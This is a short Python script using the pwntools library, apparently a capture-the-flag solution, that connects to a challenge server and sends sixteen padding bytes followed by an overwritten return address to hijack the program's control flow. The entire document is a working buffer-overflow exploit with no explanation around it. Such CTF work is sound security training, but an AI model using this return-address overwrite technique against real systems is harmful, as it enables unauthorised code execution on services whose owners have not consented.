from pwn import *


conn = remote('ctf21.softwaresecurity.no', 7001)
print(conn.recvline())

send = b'a'*16+b'\xf6\x11\x40\x00\x00\x00\x00\x00'
conn.sendline(send)

print(conn.recvall())
